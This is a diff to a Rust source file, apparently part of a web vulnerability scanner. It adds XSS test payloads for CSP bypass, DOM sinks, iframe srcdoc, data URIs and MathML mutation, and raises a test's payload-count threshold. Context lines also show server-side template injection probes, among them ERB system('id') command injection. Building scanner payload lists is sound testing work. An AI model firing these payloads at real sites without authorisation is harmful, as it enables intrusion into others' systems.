@@ -37,7 +37,7 @@ pub fn get_payloads() -> Vec<Payload> {
             ("&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;", "HTML entity hex", Severity::High),
             ("&#60;script&#62;alert(1)&#60;/script&#62;", "HTML entity decimal", Severity::High),
             ("%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "URL encoded img", Severity::High),
-            ("%3Cscript%3Ealert(1)%3C/script%3E", "Unicode escapes", Severity::High),
+            ("%3Cscript%3Ealert(1)%3C%2Fscript%3E", "Double encoded script", Severity::High),
             ("%253Cscript%253Ealert(1)%253C/script%253E", "Double URL encoded", Severity::Medium),
             ("%C0%AEscript%C0%AEalert(1)%C0%AE/script%C0%AE", "Overlong UTF-8", Severity::Medium),
         ];
@@ -84,6 +84,35 @@ pub fn get_payloads() -> Vec<Payload> {
             ("#{7*7}", "Ruby SSTI test", Severity::Medium),
             ("{{config.items()}}", "Flask config disclosure", Severity::High),
             ("<%= system('id') %>", "ERB command injection", Severity::Critical),
+        ];
+        "csp-bypass", [
+            ("'-alert(1)-'", "CSP nonce bypass via string breakout", Severity::High),
+            ("<svg/onload=alert(1)>", "SVG without script tag CSP bypass", Severity::Critical),
+            ("<details open ontoggle=alert(1)>", "Details element CSP bypass", Severity::High),
+            ("<img src=x onerror=alert(1)>", "Img CSP bypass", Severity::Critical),
+            ("/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert())//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>`", "Polyglot CSP bypass", Severity::Critical),
+        ];
+        "dom-xss", [
+            ("javascript:alert(document.domain)", "javascript: protocol via location", Severity::High),
+            ("data:text/html,<script>alert(1)</script>", "Data URI", Severity::Critical),
+            ("<img src=x onerror=alert(1)>", "DOM sink via img", Severity::Critical),
+            ("<svg onload=alert(1)>", "SVG DOM sink", Severity::Critical),
+            ("><script>alert(1)</script>", "Attribute breakout DOM sink", Severity::Critical),
+        ];
+        "srcdoc", [
+            ("<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>", "srcdoc with script", Severity::Critical),
+            ("<iframe srcdoc=\"<img src=x onerror=alert(1)>\">", "srcdoc with img", Severity::Critical),
+            ("<iframe srcdoc=\"<svg onload=alert(1)>\">", "srcdoc with svg", Severity::Critical),
+        ];
+        "data-uri", [
+            ("<a href=\"data:text/html,<script>alert(1)</script>\">Click</a>", "Data URI link", Severity::Critical),
+            ("<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">", "Embed data URI", Severity::Critical),
+            ("<object data=\"data:text/html,<script>alert(1)</script>\">", "Object data URI", Severity::Critical),
+        ];
+        "math", [
+            ("<math><maction actiontype=\"statusline\" xlink:href=\"javascript:alert(1)\">click</maction></math>", "MathML maction", Severity::Critical),
+            ("<math><mtext><table><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src=1>\">", "MathML nested", Severity::Critical),
+            ("<math><mi href=\"javascript:alert(1)\">click</mi></math>", "MathML mi", Severity::High),
         ];
     );
 
@@ -192,7 +221,7 @@ mod tests {
     fn minimum_payload_count() {
         let payloads = get_payloads();
         assert!(
-            payloads.len() >= 30,
+            payloads.len() >= 40,
             "Must have substantial XSS payload coverage, got {}",
             payloads.len()
         );
